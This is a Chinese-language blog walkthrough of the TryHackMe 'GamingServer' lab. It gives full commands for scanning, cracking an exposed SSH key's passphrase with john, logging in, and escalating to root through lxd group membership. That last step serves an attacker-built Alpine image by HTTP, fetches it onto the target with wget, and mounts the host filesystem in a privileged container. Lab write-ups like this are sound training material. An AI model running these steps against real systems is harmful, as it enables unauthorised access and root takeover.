---
title: "THM GamingServer"
description: "TryHackMe篇之GamingServer"

date: 2024-10-06T13:28:31+08:00
lastmod: 2025-11-11T10:54:33+08:00

math: true
mermaid: true

categories:
  - TryHackMe
tags:
  - Linux
---
<!--more-->

> 靶机ip：10.10.121.5

# 信息收集

## nmap扫描

`nmap --min-rate 10000 -sS -sV -sC 10.10.121.5`

![image-20241006142136365](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241006142138386-1644378651.png)

只开放了22和80端口

## 80端口

![image-20241C:/Users/lemon/AppData/Roaming/Typora/typora-user-images/image-20241006142532131.png)

![image-20241006142533235](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241006142535295-1944826601.png)

非常炫酷的界面

浏览之后发现在`http://10.10.121.5/about.html#` 下，有个`upload`按钮，点击一下

![image-20241006142810609](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241006142812327-1270244026.png)

这时候发现就跳转到了可以浏览目录的页面

![image-20241006142835118](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241006142836482-132291457.png)

在`dict.lst`中是一个字典

![image-20241006142912365](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241006142914037-561726342.png)

将其下载到本地，留着以后可能用得上

`manifesto.txt`内容如下，是一封信

![image-20241006143157410](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241006143159087-987491040.png)

得到一个用户名`Mentor`

现在我们有了一个用户名和一个密码字典，之前端口探测的时候，发现22端口是开放的，我们可以尝试通过爆破`ssh`密码尝试登录

# 获取普通权限

![image-20241006144347297](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241006144348962-739972565.png)

很可惜，没有破解成功，继续尝试扫描一下目录

`gobuster dir -u http://10.10.121.5/ -w /usr/share/wordlists/dirb/common.txt`

![image-20241006144924456](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241006144925900-1562652202.png)

发现有几个特别的信息，查看一下

![image-20241006145021856](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241006145023295-181828212.png)

`robots.txt`里的信息并不太重要，因为我们之前点击`upload`访问过这个目录

![image-20241006145110462](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241006145111847-955401844.png)

这个`/secret`目录是个新目录，之前没有找到，查看一下`secretKey`文件

![image-20241006145147571](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241006145149070-1566565554.png)

发现这是`RSA`私钥文件，下载下来保存为`id_rsa`并赋予`600`权限，爆破加密私钥的密码

先将`id_rsa`转换为hash格式

`ssh2john id_rsa > rsa_hash`

![image-20241006150304289](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241006150305820-1630075297.png)

使用`john`开始爆破

`john rsa_hash --wordlist=/usr/share/wordlists/rockyou.txt`

使用`john rsa_hash --show`查看结果

![image-20241006150548683](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241006150549966-1727897226.png)

找到密码`letmein`，使用ssh私钥登录

`ssh Mentor@10.10.121.5 -i id_rsa`

![image-20241006151531886](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241006151533269-1114822329.png)

登陆后还是失败了，肯定是之前有哪些信息没有注意到

![image-20241006151643801](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241006151645250-647968347.png)

在首页源码处发现另一个用户`john`，使用这个用户尝试登录

`ssh john@10.10.121.5 -i id_rsa`

![image-20241006151827027](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241006151828540-1248866941.png)

登陆成功，看来之前的那封信只是一封信而已

![image-20241006153329663](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241006153331301-1480645588.png)

直接在当前目录找到`user.txt`

# 权限提升

`sudo -l`由于缺少密码利用不了，查看其他内容时也没有可以利用的信息

使用`id`查看一下当前权限

![image-20241006153614508](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241006153616066-342538492.png)

发现可以利用`lxd`提权

* 攻击机准备

```bash
通过git将构建好的alpine镜像克隆至本地；执行“build -alpine”命令完成最新版本的Alpine镜像构建，此操作必须由root用户完成
将tar文件发送至目标设备

git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine
运行完上述命令之后，会在当前目录下创建一个tar.gz文件，之后我们需要将其发送至目标系统

另一方面，我们还需要将alpine镜像发送至目标系统的/tmp目录中
python -m http.server 8081
```

![image-20241006160508143](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241006160509601-1470459792.png)

* 靶机操作

```bash
cd /tmp
wget http://10.11.101.220:8081/apline-v3.10-x86_64-20191008_1227.tar.gz
```

![image-20241006160620196](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241006160621679-466446020.png)

镜像构建完成之后，我们就可以将其以镜像的形式添加进LXD了

`lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage`

使用`lxc image list`命令即可检查可用的容器列表

![image-20241006160942338](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241006160943758-117140868.png)

执行以下命令进行提权

```bash
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
id
```

![image-20241006161122252](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241006161123649-1743013902.png)

进入容器之后，定位到`/mnt/root`即可查看目标主机设备的所有资源。运行了Bash脚本之后，我们将得到一个特殊的Shell，也就是容器的Shell。这个容器中包含了目标主机的全部资源

![image-20241006161421526](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241006161422968-662607515.png)



最后在`/mnt/root/root`下找到`root.txt`